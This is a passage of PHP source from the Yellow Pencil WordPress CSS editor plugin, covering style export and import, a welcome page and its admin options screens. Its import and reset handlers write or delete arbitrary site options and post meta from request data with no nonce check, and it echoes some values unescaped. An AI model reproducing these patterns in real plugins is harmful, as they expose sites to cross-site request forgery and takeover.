	$option_Data = yp_get_all_options('wt_',true);
	$option_Anims = yp_get_all_options('yp_anim',true);

	if(is_array($postmeta_CSS)){
		array_push($allData,$postmeta_CSS);
	}

	if(is_array($postmeta_HTML)){
		array_push($allData,$postmeta_HTML);
	}

	if(is_array($option_Data)){
		array_push($allData,$option_Data);
	}

	if(is_array($option_Anims)){
		array_push($allData,$option_Anims);
	}

	if(empty($allData) == false){
		$data = array_values($allData);	
		$jsonData = json_encode($data);
		return $jsonData;
	}

	return false;

}



/* ---------------------------------------------------- */
/* Generate All CSS styles as ready-to-use				*/
/* ---------------------------------------------------- */
/* $method = 'export' / 'create' (string)				*/
/* ---------------------------------------------------- */
function yp_get_export_css($method){

	// Array
	$allData = array();

	// Getting all from database
	$postmeta_CSS = yp_get_all_post_options('_wt_css',false);
	$option_Data = yp_get_all_options('wt_',false);
	$option_Anims = yp_get_all_options('yp_anim',false);

	// Push option data to Array
	if(is_array($option_Data)){
		array_push($allData,$option_Data);
	}

	// Push postmeta data to Array
	if(is_array($postmeta_CSS)){
		array_push($allData,$postmeta_CSS);
	}

	// Check if there have animations
	if(is_array($option_Anims)){

		// Push custom animations to Array
		array_push($allData,$option_Anims);

		// New Array for webkit prefix
		$option_AnimWebkit = array();

		// Copy animations as webkit
		foreach ($option_Anims as $key => $animate){
			$option_AnimWebkit["Webkit ".$key] = str_replace("@keyframes", "@-webkit-keyframes", $animate);
		}

		// Push Animations
		array_push($allData, $option_AnimWebkit);

	}


	// Be sure The data not empty
	if(empty($allData) == false){

		// Clean array
		$data = array_values($allData);

		// Variables
		$output = null;
		$table = array();
		$tableIndex = 0;
		$prefix = '';

		// Adding WordPress Page, category etc classes to all CSS Selectors.
		foreach ($data as $nodes){

			foreach ($nodes as $key => $css){
			$tableIndex++;

				// If post meta
				if(strstr($key, '._')){

					$keyArray = explode(".", $key);
					$postID = $keyArray[0];
					$type = get_post_type($postID);
					$title = '"'.ucfirst(get_the_title($postID)).'" '.ucfirst($type).'';

					$page_for_posts = get_option( 'page_for_posts' );

					if($page_for_posts == $postID){
						$prefix = '.blog';
					}elseif($type == 'page'){
						$prefix = '.page-id-'.$postID.'';
					}else{
						$prefix = '.postid-'.$postID.'';
					}

				}else{

					if($key == 'wt_css'){
						$title = 'Global Styles';
						$prefix = '';
					}else if($key == 'wt_author_css'){
						$title = 'Author Page';
						$prefix = '.author';
					}else if($key == 'wt_category_css'){
						$title = 'Category Page';
						$prefix = '.category';
					}else if($key == 'wt_tag_css'){
						$title = 'Tag Page';
						$prefix = '.tag';
					}else if($key == 'wt_404_css'){
						$title = '404 Error Page';
						$prefix = '.error404';
					}else if($key == 'wt_search_css'){
						$title = 'Search Page';
						$prefix = '.search';
					}else if($key == 'wt_home_css'){
						$title = 'Home Page';
						$prefix = '.home';
					}

					else if(strstr($key, 'yp_anim')){
						$title = str_replace("yp_anim_", "", $key);
						$title = $title." Animate";
					}else if(strstr($key, 'wt_') && strstr($key, '_css')){
						$title = str_replace("wt_", "", $key);
						$title = str_replace("_css", "", $title);

						if(strtolower($title) == 'page'){
							$prefix = '.page';
						}else{
							$prefix = '.single-'.strtolower($title).'';
						}

						$title = $title." Template";
					}

				}

				if(!strstr($key, '_styles')){
					$len = 48-(strlen($title)+2);
					$extra = null;

					for ($i=1; $i < $len; $i++){
						$extra .= ' ';
					}

					array_push($table, ucfirst($title));
					$output .= "/*-----------------------------------------------*/\r\n";
					$output .= "/*  ".ucfirst($title)."".$extra."*/\r\n";
					$output .= "/*-----------------------------------------------*/\r\n";
					$output .= yp_add_prefix_to_css_selectors($css,$prefix)."\r\n\r\n\r\n\r\n";

				}

			}

		}
		// Foreach end.


		// Create a table list for CSS codes
		$tableList = null;
		$plusNumber = 1;
		$googleFonts = array();

		// Get fonts from CSS output
		if($method == 'export'){
			$googleFonts = yp_get_font_families($output,'import');
		}

		// If has any Google Font; Add Font familes to first table list.
		if(count($googleFonts) > 0){
			$tableList = "    01. Font Families\r\n";
			$plusNumber = 2;
		}

		// Creating a table list.
		foreach ($table as $key => $value) {
			$tableList .= "    ".sprintf("%02d", $key+$plusNumber).". ".$value."\r\n";
		}


		// Google Fonts
		if(count($googleFonts) > 0 && is_array($googleFonts)){
			$FontsCSS = "/*-----------------------------------------------*/\r\n";
			$FontsCSS .= "/* Font Families                                 */\r\n";
			$FontsCSS .= "/*-----------------------------------------------*/\r\n";

			foreach($googleFonts as $fontURL){
				$FontsCSS .= "@import url('".$fontURL."');\r\n";
			}

			$FontsCSS .= "\r\n\r\n\r\n";
		}


		// All in.
		$allOutPut = "/*\r\n\r\n    All these CSS codes generated by Yellow Pencil Editor.\r\n";
		$allOutPut .= "    http://waspthemes.com/yellow-pencil\r\n\r\n\r\n";
		$allOutPut .= "    T A B L E   O F   C O N T E N T S\r\n";
		$allOutPut .= "    ........................................................................\r\n\r\n";
		$allOutPut .= $tableList;
		$allOutPut .= "\r\n*/\r\n\r\n\r\n\r\n";

		// Adding Google Fonts to OutPut.
		if(count($googleFonts) > 0){
			$allOutPut .= $FontsCSS;
		}

		// Adding all CSS codues
		$allOutPut .= $output;

		// Process with some PHP functions and return Output CSS code.
		if($method == 'export'){
			return yp_css_prefix(yp_export_animation_prefix(yp_hover_focus_match(trim($allOutPut))));
		}else{
			return yp_css_prefix(yp_animation_prefix(yp_hover_focus_match(trim($allOutPut))));
		}		

	}

}



/* ---------------------------------------------------- */
/* Import Plugin data                					*/
/* ---------------------------------------------------- */
function yp_import_data($json){

	$json = stripslashes($json);

	if(empty($json)){
		return false;
	}

	$array = json_decode($json,true);

	foreach ($array as $nodes){

		foreach ($nodes as $key => $value){

			$value = yp_decode($value);

			// If post meta
			if(strstr($key, '._')){

				$keyArray = explode(".", $key);
				$postID = $keyArray[0];
				$metaKey = $keyArray[1];

				if(!add_post_meta($postID, $metaKey,$value,true)){
				   update_post_meta($postID,$metaKey,$value);
				}

			}else{ // else option
				if(!update_option($key,$value)){
					add_option($key,$value);
				}
			}

		}

	}

}



/* ---------------------------------------------------- */
/* Export CSS as style.css 	 							*/
/* ---------------------------------------------------- */
function yp_exportCSS_admin_header(){

	if(isset($_GET['yp_exportCSS'])){

		if($_GET['yp_exportCSS'] == 'true'){

		$data = yp_get_export_css("export");

		header('Content-Disposition: attachment; filename="style-'.strtolower(date("M-d")).'.css"');
		header("Content-type: text/css; charset: UTF-8");
		header('Content-Length: ' . strlen($data));
		header('Connection: close');

		echo $data;

		die();

		}

	}

}

add_action("admin_init","yp_exportCSS_admin_header",9999);


/* ---------------------------------------------------- */
/* Adding welcome screen Hook							*/
/* ---------------------------------------------------- */
function welcome_screen_activate() {
  set_transient( '_welcome_screen_activation_redirect', true, 30 );
}

register_activation_hook( __FILE__, 'welcome_screen_activate' );



/* ---------------------------------------------------- */
/* Automatic redirect after active						*/
/* ---------------------------------------------------- */
function welcome_screen_do_activation_redirect() {
  // Bail if no activation redirect
    if ( ! get_transient( '_welcome_screen_activation_redirect' ) ) {
    return;
  }

  // Delete the redirect transient
  delete_transient( '_welcome_screen_activation_redirect' );

  // Bail if activating from network, or bulk
  if ( is_network_admin() || isset( $_GET['activate-multi'] ) ) {
    return;
  }

  // Redirect to bbPress about page
  wp_safe_redirect( add_query_arg( array( 'page' => 'yp-welcome-screen' ), admin_url( 'admin.php' ) ) );

}

add_action( 'admin_init', 'welcome_screen_do_activation_redirect' );



/* ---------------------------------------------------- */
/* Welcome Screen Content 								*/
/* ---------------------------------------------------- */
function yp_welcome_screen_content(){
  ?>
  <div class="wrap yp-page-welcome about-wrap">
	<h1>Welcome to Yellow Pencil <?php echo YP_VERSION; ?></h1>

	<div class="about-text">
		Congratulations! You are about to use most powerful design tool for WordPress ever - Yellow Pencil Style Editor Plugin by WaspThemes.</div>
	<div class="wp-badge yp-badge">Version <?php echo YP_VERSION; ?></div>
	<p>
		<a href="<?php echo admin_url('themes.php?page=yellow-pencil'); ?>" class="button button-primary button-large">let's start!</a>
	</p>
	<h2 class="nav-tab-wrapper">
			<a href="<?php echo admin_url('admin.php?page=yp-welcome-screen'); ?>" class="nav-tab<?php if(isset($_GET['tab']) == false){ ?> nav-tab-active<?php } ?>">Hello</a>
			<a href="<?php echo admin_url('admin.php?page=yp-welcome-screen&tab=resources'); ?>" class="nav-tab<?php if(isset($_GET['tab']) == true){ ?> nav-tab-active<?php } ?>">Resources</a>
	</h2>

	<?php if(isset($_GET['tab']) == false){ ?>
	<div class="yp-welcome-tab">

		<img class="yp-featured-img" src="<?php echo WT_PLUGIN_URL; ?>images/promo.png" />

		<div class="yp-right-content">
			<h3>Front-End Design Tool For WordPress!</h3>
			<p>Yellow Pencil is advanced visual CSS style editor wordpress plugin that you can customize your website in real-time with a few clicks. Yellow Pencil works with any theme and plugin.</p>

			<p>Today become a professional web designer and personalizing your website in a few mins!</p>

			<h3>What's New?</h3>
			Take a look to <a href="http://waspthemes.com/yellow-pencil/inc/changelog.txt" target="_blank">changelog</a> for see all details about new updates.
		</div>
		<div class="clear"></div>

	</div>
	<?php }else{ ?>
	<div class="yp-welcome-tab">

		<div class="yp-resources-left">
			<h3>Resources</h3>
			<ul>
				<li><a href="http://waspthemes.com/yellow-pencil/" target="_blank">Official Website</a></li>
				<li><a href="http://waspthemes.com/yellow-pencil/documentation/" target="_blank">Documentation</a></li>
				<li><a href="https://www.youtube.com/channel/UCKGdPyfmphEdBWPXR91GnYQ" target="_blank">Tutorials</a></li>
				<li><a href="http://waspthemes.com/yellow-pencil/inc/changelog.txt" target="_blank">Changelogs</a></li>
				<li><a href="https://www.facebook.com/waspthemes/" target="_blank">Facebook page</a></li>
				<li><a href="https://waspthemes.ticksy.com/" target="_blank">Official support</a></li>
			</ul>
		</div>

		<div class="yp-resources-right">
			<h3>Versions</h3>
			
			<ul>
				<li><a href="https://wordpress.org/plugins/yellow-pencil-visual-theme-customizer/" target="_blank">Get Lite Version (Free)</a></li>
				<li><a href="http://codecanyon.net/item/yellow-pencil-visual-customizer-for-wordpress/11322180?ref=WaspThemes" target="_blank">Get Pro Version</a></li>
			</ul>

			<h3>Licenses</h3>
			
			<ul>
				<li><a href="http://themeforest.net/licenses/terms/regular" target="_blank">Regular Licence</a></li>
				<li><a href="http://themeforest.net/licenses/terms/extended" target="_blank">Extended Licence</a></li>
			</ul>

		</div>
		<div class="clear"></div>

	</div>
	<?php } ?>

	<?php if(isset($_GET['tab']) == false){ ?>
	<div class="yp-welcome-feature feature-section">

		<div class="yp-column">
			<img class="yp-img-center" src="<?php echo WT_PLUGIN_URL; ?>images/promo-1.png">
			
			<div class="yp-feature-column">
				<h4>Customize Your Website!</h4>
				<p>Edit colors, fonts, sizes and others with a few click for all screen sizes. <a href="<?php echo admin_url('themes.php?page=yellow-pencil'); ?>">start to visual customizing</a>.</p>
			</div>

		</div>

		<div class="yp-column">
			<img class="yp-img-center" src="<?php echo WT_PLUGIN_URL; ?>images/promo-2.png">
			
			<div class="yp-feature-column">
				<h4>Manage Style Sources</h4>
				<p>Keep site design in your control, You always can manage style sources from <a href="<?php echo admin_url('admin.php?page=yellow-pencil-changes'); ?>">this page</a>.</p>
			</div>

		</div>

		<div class="yp-column">
			<img class="yp-img-center" src="<?php echo WT_PLUGIN_URL; ?>images/promo-3.png">
			
			<div class="yp-feature-column">
				<h4>Help & Support!</h4>
				<p>You must read all plugin documentation for learn how this works, Only 3 mins to read! <a target="_blank" href="http://waspthemes.com/yellow-pencil/documentation/">plugin docs</a>.</p>
			</div>

		</div>

		<div class="clear"></div>

	</div>

	<p class="yp-thank-you">Thank you for choosing Yellow Pencil,<br>Made By WaspThemes.</p>
	<?php } ?>

</div>
  <?php
}



/* ---------------------------------------------------- */
/* Adding plugin control menu 							*/
/* ---------------------------------------------------- */
function yp_add_setting_menu() {

    add_menu_page (
        'Yellow Pencil Options',
        'Yellow Pencil',
        'edit_theme_options',
        'yellow-pencil-changes',
        'yp_option_func',
        'dashicons-admin-customizer'
    );

    add_submenu_page( 'yellow-pencil-changes', __('CSS Styles','yp'), __('CSS Styles','yp'), 'edit_theme_options', 'yellow-pencil-changes', 'yp_option_func' );

    add_submenu_page( 'yellow-pencil-changes', __('Settings','yp'), __('Settings','yp'), 'edit_theme_options', 'yellow-pencil-settings', 'yp_option_func' );

    add_submenu_page( 'yellow-pencil-changes', __('Custom Animations','yp'), __('Custom Animations','yp'), 'edit_theme_options', 'yellow-pencil-animations', 'yp_option_func' );

    add_submenu_page( 'yellow-pencil-changes', __('Product License','yp'), __('Product License','yp'), 'edit_theme_options', 'yellow-pencil-license', 'yp_option_func' );

    add_submenu_page( 'yellow-pencil-changes', __('Import/Export','yp'), __('Import/Export','yp'), 'edit_theme_options', 'yellow-pencil-export', 'yp_option_func' );

    add_submenu_page( 'yellow-pencil-changes', __('About','yp'), __('About','yp'), 'read', 'yp-welcome-screen', 'yp_welcome_screen_content' );

}

add_action('admin_menu', 'yp_add_setting_menu');



/* ---------------------------------------------------- */
/* Admin Control Functions  							*/
/* ---------------------------------------------------- */
function yp_option_func() {

		// GEt page, tab.
		$screen = get_current_screen();
		$active_tab = $screen->base;
		$active_tab = str_replace("yellow-pencil_page_", "", $active_tab);
		$active_tab = str_replace("toplevel_page_", "", $active_tab);

		// Can?
		if(current_user_can("edit_theme_options") == true){

			// Reset global data.
			if(isset($_GET['yp_reset_global'])){
				delete_option('wt_css');
				delete_option('wt_styles');
			}

			if(isset($_GET['yp_delete_animate'])){
				delete_option($_GET['yp_delete_animate']);
			}

			// Reset Post type.
			if(isset($_GET['yp_reset_type'])){
				delete_option('wt_'.$_GET['yp_reset_type'].'_css');
				delete_option('wt_'.$_GET['yp_reset_type'].'_styles');
			}

			// Reset by id.
			if(isset($_GET['yp_reset_id'])){
				delete_post_meta($_GET['yp_reset_id'],'_wt_css');
				delete_post_meta($_GET['yp_reset_id'],'_wt_styles');
			}

			// Updated.
			if(isset($_GET['yp_reset_global']) || isset($_GET['yp_reset_id']) || isset($_GET['yp_reset_type']) || isset($_GET['yp_delete_animate'])){
				echo "<script type='text/javascript'>window.location = '".admin_url('admin.php?page=yellow-pencil-changes&yp_updated=true')."';</script>";
			}

			// Import the data
			if(isset($_POST['yp_json_import_data'])){

				$data = $_POST['yp_json_import_data'];

				if(empty($data) == false){
					yp_import_data($data);
				}

			}

			// Update output format.
			if(isset($_POST['yp-output-option'])){

				$value = $_POST['yp-output-option'];

				if(!update_option('yp-output-option',$value)){
					add_option('yp-output-option',$value);
				}

				// Create a custom CSS File.
				if($value == 'external'){

					// Get All CSS data as ready-to-use
					$output = yp_get_export_css("create");

					// Update custom.css file
					yp_create_custom_css($output);

				}

			}

		}

		// Updated message.
		if(isset($_GET['yp_updated']) || isset($_POST['yp-output-option']) || isset($_POST['yp_json_import_data'])){
			?>
				<div id="message" class="updated">
			        <p><strong><?php _e('Settings saved.') ?></strong></p>
			    </div>
			<?php
		}

        ?>
        <div class="wrap">

            <h2>Yellow Pencil Options</h2>

            <h2 class="nav-tab-wrapper">  
                <a href="?page=yellow-pencil-changes" class="nav-tab <?php echo $active_tab == 'yellow-pencil-changes' ? 'nav-tab-active' : ''; ?>">CSS Styles</a>
                <a href="?page=yellow-pencil-settings" class="nav-tab <?php echo $active_tab == 'yellow-pencil-settings' ? 'nav-tab-active' : ''; ?>">Settings</a> 
                <a href="?page=yellow-pencil-animations" class="nav-tab <?php echo $active_tab == 'yellow-pencil-animations' ? 'nav-tab-active' : ''; ?>">Custom Animations</a> 
                <a href="?page=yellow-pencil-license" class="nav-tab <?php echo $active_tab == 'yellow-pencil-license' ? 'nav-tab-active' : ''; ?>">Product License</a>
                <a href="?page=yellow-pencil-export" class="nav-tab <?php echo $active_tab == 'yellow-pencil-export' ? 'nav-tab-active' : ''; ?>">Import / Export</a>
            </h2>

            <?php

            	
            	/* ---------------------------------------------------- */
				/* CSS CHANGES               							*/
				/* ---------------------------------------------------- */
                if( $active_tab == 'yellow-pencil-changes' ) {

                ?>

                	<div class="yp-tab-section">

                    <p><?php _e('All customized pages are listed below. You can delete and customize to them.','yp'); ?></p>

					<div class="yp-code-group">

					<ul>

						<?php $count = 0; if(get_option("wt_css") != ''){ $count = 1; ?>
							<li>
									<span class="yp-title"><?php _e('Global','yp'); ?></span>
									<a class="yp-remove" onclick="return confirm('<?php _e("Are you sure?","yp"); ?>')" href="<?php echo admin_url('admin.php?page=yellow-pencil-changes&yp_reset_global=true'); ?>"><span class="dashicons dashicons-no"></span> <?php _e('Delete','yp'); ?></a>

									<a class="yp-customize" href="<?php echo admin_url('admin.php?page=yellow-pencil-editor&href='.yp_urlencode(get_home_url().'/')); ?>"><span class="dashicons dashicons-edit"></span> <?php _e('Customize','yp'); ?></a>

									<span class="yp-clearfix"></span>
								</li>
						<?php } ?>

						<?php

							$post_types = get_post_types();
							foreach ($post_types as $post_type){

								if(get_option("wt_".$post_type."_css") != ''){

								$count = 1;

								$last_post = wp_get_recent_posts(array("post_status" => "publish","numberposts" => 1, "post_type" => $post_type));
								if(empty($last_post) == false){
									$last_post_id = $last_post['0']['ID'];
								}
							?>
								<li>
									<span class="yp-title"><?php _e('Single','yp'); ?> <?php echo ucfirst($post_type); ?> <?php _e('Template','yp'); ?></span>
									<a class="yp-remove" onclick="return confirm('<?php _e("Are you sure?","yp"); ?>')" href="<?php echo admin_url('admin.php?page=yellow-pencil-changes&yp_reset_type='.$post_type.''); ?>"><span class="dashicons dashicons-no"></span> <?php _e('Delete','yp'); ?></a>

									<a class="yp-customize" href="<?php echo admin_url('admin.php?page=yellow-pencil-editor&href='.yp_urlencode(get_the_permalink($last_post_id)).'&yp_type='.$post_type.''); ?>"><span class="dashicons dashicons-edit"></span> <?php _e('Customize','yp'); ?></a>

									<span class="yp-clearfix"></span>
								</li>

							<?php
								}

							}
						?>

						<?php if(get_option("wt_home_css") != ''){

						$frontpage_id = get_option('page_on_front');
						if($frontpage_id == 0 || $frontpage_id == null){ ?>
						<li>
							<span class="yp-title">Home Page</span>
							<a class="yp-remove" onclick="return confirm('<?php _e("Are you sure?","yp"); ?>')" href="<?php echo admin_url('admin.php?page=yellow-pencil-changes&yp_reset_type=home'); ?>"><span class="dashicons dashicons-no"></span> <?php _e('Delete','yp'); ?></a>
							<a class="yp-customize" href="<?php echo admin_url('admin.php?page=yellow-pencil-editor&href='.yp_urlencode(esc_url(get_home_url().'/')).'&yp_type=home'); ?>"><span class="dashicons dashicons-edit"></span> <?php _e('Customize','yp'); ?></a>
							<span class="yp-clearfix"></span>
						</li>
						<?php } } ?>

						<?php if(get_option("wt_search_css") != ''){ ?>
						<li>
							<span class="yp-title">Search Template</span>
							<a class="yp-remove" onclick="return confirm('<?php _e("Are you sure?","yp"); ?>')" href="<?php echo admin_url('admin.php?page=yellow-pencil-changes&yp_reset_type=search'); ?>"><span class="dashicons dashicons-no"></span> <?php _e('Delete','yp'); ?></a>
							<a class="yp-customize" href="<?php echo admin_url('admin.php?page=yellow-pencil-editor&href='.yp_urlencode(esc_url(get_home_url().'/?s='.yp_getting_last_post_title().'')).'&yp_type=search'); ?>"><span class="dashicons dashicons-edit"></span> <?php _e('Customize','yp'); ?></a>
							<span class="yp-clearfix"></span>
						</li>
						<?php } ?>

						<?php if(get_option("wt_404_css") != ''){ ?>
						<li>
							<span class="yp-title">404 Template</span>
							<a class="yp-remove" onclick="return confirm('<?php _e("Are you sure?","yp"); ?>')" href="<?php echo admin_url('admin.php?page=yellow-pencil-changes&yp_reset_type=404'); ?>"><span class="dashicons dashicons-no"></span> <?php _e('Delete','yp'); ?></a>
							<a class="yp-customize" href="<?php echo admin_url('admin.php?page=yellow-pencil-editor&href='.yp_urlencode(esc_url(get_home_url().'/?p=987654321')).'&yp_type=404'); ?>"><span class="dashicons dashicons-edit"></span> <?php _e('Customize','yp'); ?></a>
							<span class="yp-clearfix"></span>
						</li>
						<?php } ?>

						<?php if(get_option("wt_tag_css") != ''){ ?>
						<?php

						$tag_id = '';
						$tags = get_tags(array('orderby' => 'count', 'order' => 'DESC','number'=> 1 ));
						if(empty($tags) == false){
							$tag_id = $tags[0];
						}

						?>
						<li>
							<span class="yp-title">Tag Template</span>
							<a class="yp-remove" onclick="return confirm('<?php _e("Are you sure?","yp"); ?>')" href="<?php echo admin_url('admin.php?page=yellow-pencil-changes&yp_reset_type=tag'); ?>"><span class="dashicons dashicons-no"></span> <?php _e('Delete','yp'); ?></a>
							<a class="yp-customize" href="<?php echo admin_url('admin.php?page=yellow-pencil-editor&href='.yp_urlencode(esc_url(get_tag_link($tag_id))).'&yp_type=tag'); ?>"><span class="dashicons dashicons-edit"></span> <?php _e('Customize','yp'); ?></a>
							<span class="yp-clearfix"></span>
						</li>
						<?php } ?>

						<?php if(get_option("wt_category_css") != ''){ ?>
						<?php

						$cat_id = '';
						$cats = get_categories(array('orderby' => 'count', 'order' => 'DESC','number'=> 1 ));
						if(empty($cats) == false){
							$cat_id = $cats[0];
						}

						?>
						<li>
							<span class="yp-title">Category Template</span>
							<a class="yp-remove" onclick="return confirm('<?php _e("Are you sure?","yp"); ?>')" href="<?php echo admin_url('admin.php?page=yellow-pencil-changes&yp_reset_type=category'); ?>"><span class="dashicons dashicons-no"></span> <?php _e('Delete','yp'); ?></a>
							<a class="yp-customize" href="<?php echo admin_url('admin.php?page=yellow-pencil-editor&href='.yp_urlencode(esc_url(get_category_link($cat_id))).'&yp_type=category'); ?>"><span class="dashicons dashicons-edit"></span> <?php _e('Customize','yp'); ?></a>
							<span class="yp-clearfix"></span>
						</li>
						<?php } ?>

						<?php if(get_option("wt_author_css") != ''){ ?>
						<li>
							<span class="yp-title">Author Template</span>
							<a class="yp-remove" onclick="return confirm('<?php _e("Are you sure?","yp"); ?>')" href="<?php echo admin_url('admin.php?page=yellow-pencil-changes&yp_reset_type=author'); ?>"><span class="dashicons dashicons-no"></span> <?php _e('Delete','yp'); ?></a>
							<a class="yp-customize" href="<?php echo admin_url('admin.php?page=yellow-pencil-editor&href='.yp_urlencode(esc_url(get_author_posts_url(1))).'&yp_type=author'); ?>"><span class="dashicons dashicons-edit"></span> <?php _e('Customize','yp'); ?></a>
							<span class="yp-clearfix"></span>
						</li>
						<?php } ?>

						<?php if(get_option("wt_wordpress_panel_css") != ''){ ?>
						<li>
							<span class="yp-title">WordPress Panel</span>
							<a class="yp-remove" onclick="return confirm('<?php _e("Are you sure?","yp"); ?>')" href="<?php echo admin_url('admin.php?page=yellow-pencil-changes&yp_reset_type=wordpress_panel'); ?>"><span class="dashicons dashicons-no"></span> <?php _e('Delete','yp'); ?></a>
							<a class="yp-customize" href="<?php echo admin_url('admin.php?page=yellow-pencil-editor&href='.yp_urlencode(esc_url(get_dashboard_url())).'&yp_type=wordpress_panel'); ?>"><span class="dashicons dashicons-edit"></span> <?php _e('Customize','yp'); ?></a>
							<span class="yp-clearfix"></span>
						</li>
						<?php } ?>

						<?php

							global $wpdb;
							$querystr = "SELECT * FROM `$wpdb->postmeta` WHERE `meta_key` LIKE '_wt_css'";
							$pageposts = $wpdb->get_results($querystr, OBJECT);

							if($pageposts):

								global $post;

								foreach ($pageposts as $post):

								$id = $post->post_id;
								$title = "'".ucfirst(get_the_title($id))."'";

								if($title == "''"){
									$title = '(Unknown)';
								}

								if(get_post_meta($id, '_wt_css', true) != ''){
								$count = 1;
								?>

									<li>
										<span class="yp-title"><?php echo $title; ?> <?php echo ucfirst(get_post_type($id)); ?></span>
										<a class="yp-remove" onclick="return confirm('<?php _e("Are you sure?","yp"); ?>')" href="<?php echo admin_url('admin.php?page=yellow-pencil-changes&yp_reset_id='.$id.''); ?>"><span class="dashicons dashicons-no"></span> <?php _e('Delete','yp'); ?></a>

										<a class="yp-customize" href="<?php echo admin_url('admin.php?page=yellow-pencil-editor&href='.yp_urlencode(get_the_permalink($id)).'&yp_id='.$id.''); ?>"><span class="dashicons dashicons-edit"></span> <?php _e('Customize','yp'); ?></a>

										<span class="yp-clearfix"></span>
									</li>

								<?php
								}

								endforeach;

							endif;
							wp_reset_query();

						?>

						<?php

							if(0 == $count){
								echo '<li>'.__("No CSS Style! First, Customize something on your website.","yp").'</li>';
							}

						?>

					</ul>

					<?php if($count > 0){ ?>
					<p><a href="<?php echo admin_url('admin.php?page=yellow-pencil-changes&yp_exportCSS=true'); ?>" class="button">Download</a> all style codes as ready to use.</p>	
					<?php } ?>

					</div>

					</div>

					<?php


				/* ---------------------------------------------------- */
				/* SETTINGS                 							*/
				/* ---------------------------------------------------- */
                } elseif( $active_tab == 'yellow-pencil-settings' )  {

                	?>

                	<div class="yp-tab-section">

                	<h2>Output CSS Options</h2>
					<p>External CSS option still in beta test, Please use dynamic CSS option if there is an issue.</p>
					<form method="POST">
						<table class="form-table yp-form-table">
							<tbody>
							<tr>
								<?php

									$a = '';
									$b = '';
									if(get_option('yp-output-option') == 'external'){
										$a = 'checked="checked"';
									}

									if(get_option('yp-output-option') != 'external'){
										$b = 'checked="checked"';
									}

								?>
								<th><label><input name="yp-output-option" value="external" <?php echo $a; ?> type="radio"> Static External CSS File</label></th>
								<td><code><?php echo get_site_url(null,'custom.css'); ?></code></td>
							</tr>
							<tr>
								<th><label><input name="yp-output-option" value="inline" <?php echo $b; ?> type="radio"> Dynamic Inline CSS</label></th>
								<td><code>&lt;head&gt;&lt;style&gt;.body{color:gray...</code></td>
							</tr>
							</tbody>
						</table>
						<div class="yp-output-css-footer">
							<input type="submit" class="button-primary" value="Save Changes" />
						</div>
					</form>

				</div>

                	<?php


                /* ---------------------------------------------------- */
				/* ANIMATIONS               							*/
				/* ---------------------------------------------------- */
                } elseif( $active_tab == 'yellow-pencil-animations' )  {

                    ?>

                    <div class="yp-tab-section">

                    <p><?php _e('Generated animations are listed below. You can manage them.','yp'); ?></p>

					<div class="yp-code-group">

					<ul>

						<?php

							$countAnim = 0;

							$all_options =  wp_load_alloptions();
							foreach($all_options as $name => $value){
								if(stristr($name, 'yp_anim')){
									$countAnim = $countAnim+1;
									$name = str_replace("yp_anim_", "", $name);
									?>
									<li>
									<span class="yp-title"><?php echo ucwords(strtolower($name)); ?></span>
									<a class="yp-remove" onclick="return confirm('<?php _e("Are you sure?","yp"); ?>')" href="<?php echo admin_url('admin.php?page=yellow-pencil-changes&yp_delete_animate=yp_anim_'.$name.''); ?>"><span class="dashicons dashicons-no"></span> <?php _e('Delete','yp'); ?></a>
									<span class="yp-clearfix"></span>
									</li>
									<?php
								}
							}

							if(0 == $countAnim){
								echo '<li>'.__("No Custom Animation! First, Generate a few animations!","yp").'</li>';
							}

						?>
						

					</ul>

					</div>

					</div>

                    <?php


                /* ---------------------------------------------------- */
				/* LICENSE               							    */
				/* ---------------------------------------------------- */
                } elseif( $active_tab == 'yellow-pencil-license' )  {

                	$extraClassBtn = '';
                	$loadingIcon = '';

                	// If isset product license, ie activation success.
                	if(isset($_GET['purchase_code']) == true){

                		// Purchase Code
                		$code = $_GET['purchase_code'];

                		// Adds Product code
                		if(!update_option("yp_purchase_code",$code)){
							add_option("yp_purchase_code",$code);
						}

						// Upgrade to Pro Version if is lite version.
						if(defined('WTFV') == false){
	                		$extraClassBtn = ' yp-upgrade-pro-action';
	                		$loadingIcon = "<img class='yp-upgrading-loading' src='".esc_url(plugins_url( '/images/wpspin_light.gif' , __FILE__ ))."' style='position: relative;left: 20px;top: 4px;width: 20px;height: 20px;' />";
						}

                	}elseif(defined('WTFV') == false){

                		// Get purchase code from database
                		$purchase_code = get_option("yp_purchase_code");

                		// Has?
                		if($purchase_code){
                			delete_option('yp_purchase_code');
                		}

                	}

                	// Get purchase code from database
                	$purchase_code = get_option("yp_purchase_code");

                	$isActive = false;

                	// Button Text
                	if(isset($_GET['purchase_code']) || $purchase_code){
                		$isActive = true;
                		$activate_btn = 'Yellow Pencil Activated';
                		$aclink = '<a class="button button-primary button-hero yp-product-activation disabled'.$extraClassBtn.'">';

                		if($extraClassBtn != ''){
                			$activate_btn = 'Upgrading..';
                		}

                	}else{
                		$activate_btn = 'Activate Yellow Pencil Pro';
                		$aclink = '<a class="button button-primary button-hero yp-product-activation" href="http://waspthemes.com/yellow-pencil/auto-update/?client-redirect='.urlencode(admin_url('admin.php?page=yellow-pencil-license')).'">';
                	}

                	// Thank you.
                	if(isset($_GET['purchase_code']) && defined("WTFV") == TRUE){
                		echo '<div class="updated"><p><strong>Yellow Pencil Pro successfully activated.</strong></p></div>';
                	}

                	// no license founded
                	if(isset($_GET['activation_error'])){
                		echo '<div class="error"><p><strong>No licenses found on your Envato account, <a href="http://waspthemes.com/yellow-pencil/buy/" target="_blank">Get your copy today</a>.</strong></p></div>';
                	}


                	?>

                	<div class="yp-activation-section">

                		<?php if($isActive == false){ ?>
	                		<p>In order to receive all benefits of Yellow Pencil, you need to activate your copy of the plugin. By activating Yellow Pencil License you will unlock <strong>premium features</strong> and <strong>direct plugin updates</strong>.</p>
	                	<?php }else{ ?>
	                		<p>You have activated Yellow Pencil Pro version which allows you to access all the customer benefits! You will be notified when new updates are available. Thank you for choosing Yellow Pencil!</p>
	                	<?php } ?>
	                	
	                	<br />

	                    <p style="margin:0px;padding:0px;"><?php echo $aclink; ?><?php echo $activate_btn; ?></a><?php echo $loadingIcon; ?></p>

	                    <?php if($extraClassBtn != ''){ ?>
	                    	<p class='description'>Yellow Pencil Pro installing. This may take a few minutes. Please don't close the page!</p>
	                    <?php } ?>

	                    <?php if($isActive == false){ ?>
		                    <p class='description'>
							Don't have direct license yet? <a href='http://waspthemes.com/yellow-pencil/buy/' target='_blank'>Purchase Yellow Pencil license</a>.</p>
						<?php } ?>

					</div>

					<?php


				/* ---------------------------------------------------- */
				/* EXPORT/IMPORT               							*/
				/* ---------------------------------------------------- */
                } elseif( $active_tab == 'yellow-pencil-export' )  {

                    ?>

